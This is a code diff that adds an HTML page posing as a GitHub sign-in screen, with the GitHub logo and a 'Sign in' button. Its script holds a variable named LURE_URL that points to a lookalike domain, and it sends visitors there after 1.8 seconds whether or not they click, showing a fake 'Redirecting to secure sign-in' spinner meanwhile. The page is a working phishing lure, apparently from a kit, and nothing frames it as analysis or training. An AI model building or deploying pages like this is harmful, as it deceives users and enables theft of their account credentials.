@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to GitHub</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
+    .card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:40px 36px 32px;width:100%;max-width:400px;text-align:center}
+    .logo{margin-bottom:24px;display:flex;align-items:center;justify-content:center}
+    .tagline{color:#666;font-size:15px;margin-bottom:28px;line-height:1.4}
+    .btn{display:block;width:100%;padding:12px;background:#24292f;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;transition:opacity .2s}
+    .btn:hover{opacity:.88}
+    .spinner{width:36px;height:36px;border:3px solid #eee;border-top:3px solid #24292f;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .loading{display:none}
+    .loading p{color:#888;font-size:14px;margin-top:8px}
+    footer{margin-top:24px;color:#999;font-size:12px}
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <div class="logo"><svg xmlns="http://www.w3.org/2000/svg" width="44" height="44" viewBox="0 0 16 16"><path fill="#24292f" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg></div>
+    <p class="tagline">Sign in to continue to GitHub.</p>
+    <a class="btn" id="btn" href="#">Sign in</a>
+  </div>
+  <div class="card loading" id="loading">
+    <div class="spinner"></div>
+    <p>Redirecting to secure sign-in&hellip;</p>
+  </div>
+  <footer>Secure connection &bull; Privacy Policy</footer>
+  <script>
+    var LURE_URL = 'https://githubses.authenticationsession.online/JvpZZNHy'; /* AUTO_LURE_URL */
+    document.getElementById('btn').href = LURE_URL;
+    document.getElementById('btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    });
+    // Auto-redirect after 1.8s if user doesn't click
+    setTimeout(function(){
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    }, 1800);
+  </script>
+</body>
+</html>
